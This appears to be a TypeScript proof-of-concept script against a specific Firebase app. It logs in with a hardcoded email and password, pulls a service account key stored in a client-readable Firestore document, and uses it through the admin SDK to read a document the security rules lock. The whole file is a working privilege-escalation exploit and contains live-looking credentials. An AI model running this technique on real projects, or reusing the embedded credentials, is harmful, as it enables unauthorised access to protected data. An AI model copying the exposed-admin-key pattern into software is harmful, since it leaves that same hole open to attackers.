import dotenv from "dotenv";
import { initializeApp } from "firebase/app";
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";
import { doc, getDoc, getFirestore } from "firebase/firestore";
import { initializeApp as adminInitApp, cert } from "firebase-admin/app";
import { getFirestore as getAdminFirestore } from "firebase-admin/firestore";

dotenv.config();

// 1. Setup normal Client SDK
const firebaseConfig = {
	apiKey: process.env.VITE_FIREBASE_API_KEY,
	authDomain: process.env.VITE_FIREBASE_AUTH_DOMAIN,
	projectId: process.env.VITE_FIREBASE_PROJECT_ID,
	storageBucket: process.env.VITE_FIREBASE_STORAGE_BUCKET,
	messagingSenderId: process.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
	appId: process.env.VITE_FIREBASE_APP_ID,
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

const run = async () => {
	try {
		console.log("🔹 1. Logging in as normal Admin User...");
		await signInWithEmailAndPassword(auth, "damodar@cpbs.com", "413541");

		console.log(
			'\n🔹 2. Trying to read "damtoken/env" with normal Client SDK...',
		);
		try {
			await getDoc(doc(db, "damtoken", "env"));
			console.log("   ❌ Wait, this should have failed!");
		} catch (err: any) {
			console.log(
				`   ✅ Failed as expected! Firestore Rules blocked it: ${err.message}`,
			);
		}

		console.log("\n🔹 3. Fetching Service Account Key from app_config...");
		const notifDoc = await getDoc(doc(db, "app_config", "notificationkey"));
		const serviceAccountStr = notifDoc.data()?.servicekey;
		const serviceAccount = JSON.parse(serviceAccountStr);

		console.log("\n🔹 4. Initializing firebase-admin SDK (Superpower Mode)...");
		const adminApp = adminInitApp({
			credential: cert(serviceAccount),
		});
		const adminDb = getAdminFirestore(adminApp);

		console.log(
			'\n🔹 5. Trying to read "damtoken/env" with firebase-admin SDK...',
		);
		const secretDoc = await adminDb.collection("damtoken").doc("env").get();

		if (secretDoc.exists) {
			console.log(
				"   ✅ SUCCESS! Admin SDK bypassed the rules and read the locked document.",
			);
			const data = secretDoc.data();
			console.log("   --> Title found:", data?.title);
			console.log(
				"   --> Categories found:",
				Object.keys(data?.keys || {}).join(", "),
			);
		} else {
			console.log("   ❌ Document not found.");
		}

		console.log("\n🎉 Demonstration Complete!");
		process.exit(0);
	} catch (e) {
		console.error("Error:", e);
		process.exit(1);
	}
};

run();
